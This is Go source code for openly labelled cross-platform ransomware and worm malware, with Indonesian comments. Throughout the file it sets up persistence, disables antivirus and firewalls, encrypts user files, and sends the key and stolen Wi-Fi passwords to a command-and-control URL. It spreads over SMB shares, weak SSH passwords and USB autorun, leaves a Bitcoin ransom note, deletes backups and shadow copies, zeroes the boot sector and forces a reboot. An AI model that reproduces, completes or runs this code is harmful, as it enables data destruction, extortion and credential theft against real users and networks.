package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows/registry"
)

// ======================
// KONFIGURASI MALWARE
// ======================
const C2_SERVER = "http://malicious-c2-server.example/command"
var ENCRYPT_EXTENSIONS = []string{".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".txt", ".zip", ".rar", ".7z", ".sql", ".db", ".bak"}
const MAX_THREADS = 8
const RANSOM_AMOUNT = 0.5
const BTC_ADDRESS = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
const CONTACT_EMAIL = "decrypt2023@protonmail.com"

// ======================
// FUNGSI UTILITAS
// ======================
func getSystemPaths() []string {
	var paths []string

	switch runtime.GOOS {
	case "windows":
		windowsDir := os.Getenv("WINDIR")
		if windowsDir == "" {
			windowsDir = "C:\\Windows"
		}
		paths = []string{
			windowsDir + "\\System32",
			os.Getenv("APPDATA"),
			os.Getenv("USERPROFILE") + "\\Documents",
			os.Getenv("USERPROFILE") + "\\Desktop",
			os.Getenv("USERPROFILE") + "\\Pictures",
			os.Getenv("USERPROFILE") + "\\Videos",
			"\\\\?\\C:\\", // Mengatasi path panjang
		}
	default:
		paths = []string{
			"/",
			"/home",
			"/etc",
			"/var",
			os.Getenv("HOME"),
			"/mnt",
			"/media",
		}
	}

	// Filter path yang valid
	var validPaths []string
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			validPaths = append(validPaths, p)
		}
	}
	return validPaths
}

func generateKey() []byte {
	salt := make([]byte, 16)
	if _, err := crand.Read(salt); err != nil {
		log.Printf("Error generating salt: %v", err)
		return nil
	}

	password := make([]byte, 32)
	if _, err := crand.Read(password); err != nil {
		log.Printf("Error generating password: %v", err)
		return nil
	}

	return pbkdf2.Key(password, salt, 100000, 32, sha256.New)
}

func setHidden(path string) {
	if runtime.GOOS == "windows" {
		exec.Command("attrib", "+h", "+s", path).Run()
	} else {
		// Di Linux, cukup gunakan nama file yang diawali titik
	}
}

// ======================
// FUNGSI INTI MALWARE
// ======================
func establishPersistence() {
	currentFile, err := os.Executable()
	if err != nil {
		log.Printf("Error getting executable path: %v", err)
		return
	}

	switch runtime.GOOS {
	case "windows":
		systemPath := filepath.Join(os.Getenv("WINDIR"), "System32", "svchost.exe")
		if err := os.MkdirAll(filepath.Dir(systemPath), 0755); err != nil {
			log.Printf("Error creating directory: %v", err)
			return
		}

		if err := copyFile(currentFile, systemPath); err != nil {
			log.Printf("Error copying file: %v", err)
			return
		}

		key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			log.Printf("Error opening registry: %v", err)
			return
		}
		defer key.Close()
		
		if err := key.SetStringValue("WindowsUpdateService", systemPath); err != nil {
			log.Printf("Error setting registry value: %v", err)
		}
		setHidden(systemPath)

	case "linux", "darwin":
		binPath := "/usr/bin/.systemd-helper"
		if err := copyFile(currentFile, binPath); err != nil {
			log.Printf("Error copying file: %v", err)
			return
		}
		os.Chmod(binPath, 0755)
		
		// Metode persistensi multi-platform
		exec.Command("sh", "-c", `(crontab -l 2>/dev/null; echo "@reboot sleep 90 && /usr/bin/.systemd-helper") | crontab -`).Run()
		exec.Command("sh", "-c", `echo "[Unit]\nDescription=System Helper\n\n[Service]\nExecStart=/usr/bin/.systemd-helper\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/.systemd-service.service`).Run()
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("systemctl", "enable", ".systemd-service.service").Run()
	}
}

func disableDefenses() {
	switch runtime.GOOS {
	case "windows":
		// Nonaktifkan Windows Defender
		cmds := []*exec.Cmd{
			exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"),
			exec.Command("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"),
			exec.Command("netsh", "advfirewall", "set", "allprofiles", "state", "off"),
		}

		for _, cmd := range cmds {
			if err := cmd.Run(); err != nil {
				log.Printf("Error disabling defenses: %v", err)
			}
		}

		// Nonaktifkan layanan keamanan
		services := []string{"WinDefend", "wscsvc", "SecurityHealthService", "Sense", "MsMpSvc"}
		for _, service := range services {
			exec.Command("net", "stop", service, "/y").Run()
			exec.Command("sc", "config", service, "start=", "disabled").Run()
		}

	default:
		// Nonaktifkan sistem keamanan Linux
		cmds := []*exec.Cmd{
			exec.Command("setenforce", "0"),
			exec.Command("systemctl", "stop", "apparmor"),
			exec.Command("systemctl", "disable", "apparmor"),
			exec.Command("ufw", "disable"),
			exec.Command("systemctl", "stop", "firewalld"),
			exec.Command("systemctl", "disable", "firewalld"),
			exec.Command("iptables", "-F"),
		}

		for _, cmd := range cmds {
			if err := cmd.Run(); err != nil {
				log.Printf("Error disabling defenses: %v", err)
			}
		}
	}
}

func encryptFile(filePath string, cipher cipher.AEAD) {
	// Skip special filesystems
	if strings.Contains(filePath, "/dev/") || strings.Contains(filePath, "/proc/") || 
	   strings.Contains(filePath, "/sys/") || strings.Contains(filePath, "/boot/") {
		return
	}

	// Skip files too large (>100MB)
	if info, err := os.Stat(filePath); err == nil {
		if info.Size() > 100*1024*1024 {
			return
		}
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		log.Printf("Error reading file: %v", err)
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	if _, err := crand.Read(nonce); err != nil {
		log.Printf("Error generating nonce: %v", err)
		return
	}

	encrypted := cipher.Seal(nonce, nonce, data, nil)
	if err := os.WriteFile(filePath, encrypted, 0644); err != nil {
		log.Printf("Error writing encrypted file: %v", err)
		return
	}

	if err := os.Rename(filePath, filePath+".LOCKED"); err != nil {
		log.Printf("Error renaming file: %v", err)
	}
}

func encryptFiles() {
	key := generateKey()
	if key == nil {
		log.Printf("Key generation failed, skipping encryption")
		return
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		log.Printf("Error creating cipher: %v", err)
		return
	}

	cipher, err := cipher.NewGCM(block)
	if err != nil {
		log.Printf("Error creating GCM: %v", err)
		return
	}

	// Simpan kunci
	keyPath := filepath.Join(os.Getenv("HOME"), "!!!READ_ME!!!.txt")
	keyB64 := base64.StdEncoding.EncodeToString(key)
	note := fmt.Sprintf(`
	!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

	To recover your files, send %.2f BTC to:
	%s

	After payment, email proof to:
	%s

	Your ID: %s

	!!! DO NOT MODIFY FILES !!!
	`, RANSOM_AMOUNT, BTC_ADDRESS, CONTACT_EMAIL, keyB64)
	
	if err := os.WriteFile(keyPath, []byte(note), 0644); err != nil {
		log.Printf("Error writing ransom note: %v", err)
	}

	// Kirim ke C2
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	data := map[string]string{
		"host": hostname,
		"user": user.Username,
		"os":   runtime.GOOS,
		"key":  keyB64,
	}
	jsonData, _ := json.Marshal(data)
	
	// Enkripsi sebelum pengiriman
	encryptedData, _ := encryptForC2(jsonData)
	http.Post(C2_SERVER, "application/octet-stream", bytes.NewBuffer(encryptedData))

	// Enkripsi paralel
	paths := getSystemPaths()
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, MAX_THREADS)

	for _, path := range paths {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			semaphore <- struct{}{}
			
			filepath.Walk(p, func(filePath string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}
				
				for _, ext := range ENCRYPT_EXTENSIONS {
					if strings.EqualFold(filepath.Ext(filePath), ext) {
						encryptFile(filePath, cipher)
						break
					}
				}
				return nil
			})
			
			<-semaphore
		}(path)
	}
	wg.Wait()
}

func propagateNetwork() {
	currentFile, err := os.Executable()
	if err != nil {
		log.Printf("Error getting executable path: %v", err)
		return
	}

	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("net", "view")
		output, _ := cmd.Output()
		scanner := bufio.NewScanner(bytes.NewReader(output))
		var computers []string
		
		for scanner.Scan() {
			line := scanner.Text()
			if strings.HasPrefix(line, "\\\\") {
				computer := strings.Fields(line)[0]
				computers = append(computers, strings.TrimPrefix(computer, "\\\\"))
			}
		}

		for _, computer := range computers {
			for _, share := range []string{"C$", "ADMIN$", "IPC$"} {
				dest := fmt.Sprintf("\\\\%s\\%s\\Windows\\System32\\update.exe", computer, share)
				if err := copyFile(currentFile, dest); err == nil {
					setHidden(dest)
				}
			}
		}

	default:
		localIP := getLocalIP()
		if localIP == "" {
			return
		}
		
		ipParts := strings.Split(localIP, ".")
		if len(ipParts) < 4 {
			return
		}
		
		baseIP := strings.Join(ipParts[:3], ".") + "."
		commonPasswords := []string{"password", "123456", "admin", "root", "qwerty"}

		for i := 1; i < 255; i++ {
			if strconv.Itoa(i) == ipParts[3] {
				continue
			}
			
			ip := baseIP + strconv.Itoa(i)
			for _, pass := range commonPasswords {
				// SCP copy
				exec.Command("sshpass", "-p", pass, "scp", "-o", "ConnectTimeout=5", "-o", "StrictHostKeyChecking=no", currentFile, fmt.Sprintf("user@%s:/tmp/.cache", ip)).Run()
				
				// Eksekusi remote
				exec.Command("sshpass", "-p", pass, "ssh", "-o", "ConnectTimeout=5", "-o", "StrictHostKeyChecking=no", fmt.Sprintf("user@%s", ip), "chmod +x /tmp/.cache && nohup /tmp/.cache >/dev/null 2>&1 &").Run()
			}
		}
	}
}

func propagateUSB() {
	currentFile, err := os.Executable()
	if err != nil {
		log.Printf("Error getting executable path: %v", err)
		return
	}
	
	var drives []string

	if runtime.GOOS == "windows" {
		for drive := 'A'; drive <= 'Z'; drive++ {
			drivePath := string(drive) + ":\\"
			if _, err := os.Stat(drivePath); err == nil {
				drives = append(drives, drivePath)
			}
		}
	} else {
		media, _ := os.ReadDir("/media")
		for _, d := range media {
			drives = append(drives, filepath.Join("/media", d.Name()))
		}
		mnt, _ := os.ReadDir("/mnt")
		for _, d := range mnt {
			drives = append(drives, filepath.Join("/mnt", d.Name()))
		}
	}

	for _, drive := range drives {
		dest := filepath.Join(drive, "._Important_Documents.exe")
		if err := copyFile(currentFile, dest); err != nil {
			continue
		}

		if runtime.GOOS == "windows" {
			autorun := fmt.Sprintf("[autorun]\nopen=%s\naction=Open documents\nlabel=Important Documents\nicon=shell32.dll,4\n", dest)
			os.WriteFile(filepath.Join(drive, "autorun.inf"), []byte(autorun), 0644)
			setHidden(dest)
			setHidden(filepath.Join(drive, "autorun.inf"))
		} else {
			// Linux/Mac: buat file .hidden
			os.WriteFile(filepath.Join(drive, ".hidden"), []byte("._Important_Documents.exe\n"), 0644)
		}
	}
}

func stealData() {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()

	data := map[string]interface{}{
		"system": map[string]string{
			"hostname": hostname,
			"user":     user.Username,
			"os":       runtime.GOOS,
			"ip":       ip,
		},
		"wifi":     []map[string]string{},
		"browsers": map[string]interface{}{},
	}

	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "show", "profiles")
		output, _ := cmd.Output()
		scanner := bufio.NewScanner(bytes.NewReader(output))
		var profiles []string
		
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "All User Profile") {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) == 2 {
					profiles = append(profiles, strings.TrimSpace(parts[1]))
				}
			}
		}

		for _, profile := range profiles {
			cmd := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear")
			output, _ := cmd.Output()
			scanner := bufio.NewScanner(bytes.NewReader(output))
			var password string
			
			for scanner.Scan() {
				line := scanner.Text()
				if strings.Contains(line, "Key Content") {
					parts := strings.SplitN(line, ":", 2)
					if len(parts) == 2 {
						password = strings.TrimSpace(parts[1])
					}
				}
			}
			
			if password != "" {
				data["wifi"] = append(data["wifi"].([]map[string]string), map[string]string{
					"ssid":     profile,
					"password": password,
				})
			}
		}
	}

	// Simpan data dalam format terenkripsi
	jsonData, _ := json.Marshal(data)
	encryptedData, _ := encryptForC2(jsonData)
	http.Post(C2_SERVER+"/exfiltrate", "application/octet-stream", bytes.NewBuffer(encryptedData))
}

func destroySystem() {
	// Hapus backup
	if runtime.GOOS == "windows" {
		exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
		exec.Command("wbadmin", "delete", "catalog", "-quiet").Run()
	} else {
		exec.Command("rm", "-rf", "/var/backups/*").Run()
		exec.Command("rm", "-rf", "~/.local/share/Trash/*").Run()
	}

	// Overwrite MBR/Boot sector
	if runtime.GOOS == "windows" {
		exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no").Run()
		exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures").Run()
	} else {
		exec.Command("dd", "if=/dev/zero", "of=/dev/sda", "bs=512", "count=1", "conv=notrunc").Run()
	}

	// Tampilkan ransom note
	ransomNote := fmt.Sprintf(`
	!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!
	
	Send %.2f BTC to: %s
	Email proof to: %s
	
	Your system will reboot in 5 minutes...
	`, RANSOM_AMOUNT, BTC_ADDRESS, CONTACT_EMAIL)
	
	notePath := filepath.Join(os.Getenv("HOME"), "!!!READ_ME!!!.txt")
	os.WriteFile(notePath, []byte(ransomNote), 0644)

	// Reboot setelah delay
	time.Sleep(5 * time.Minute)
	if runtime.GOOS == "windows" {
		exec.Command("shutdown", "/r", "/t", "0", "/f").Run()
	} else {
		exec.Command("reboot", "-f").Run()
	}
}

// ======================
// FUNGSI UTAMA
// ======================
func main() {
	// Sembunyikan jendela (Windows)
	if runtime.GOOS == "windows" {
		hideConsole()
	}

	// Tunggu acak (60-300 detik)
	delay := time.Duration(60 + time.Now().UnixNano()%240) * time.Second
	time.Sleep(delay)

	// Eksekusi fase malware
	establishPersistence()
	disableDefenses()
	go propagateNetwork()
	go propagateUSB()
	go stealData()
	encryptFiles()
	destroySystem()
}

// ======================
// FUNGSI PEMBANTU
// ======================
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()
	return strings.Split(conn.LocalAddr().String(), ":")[0]
}

func hideConsole() {
	if runtime.GOOS == "windows" {
		exec.Command("cmd", "/C", "powershell -Window Hidden -Command ...").Run()
	}
}

func encryptForC2(data []byte) ([]byte, error) {
	key := sha256.Sum256([]byte("C2EncryptionKey"))
	block, _ := aes.NewCipher(key[:])
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	crand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}
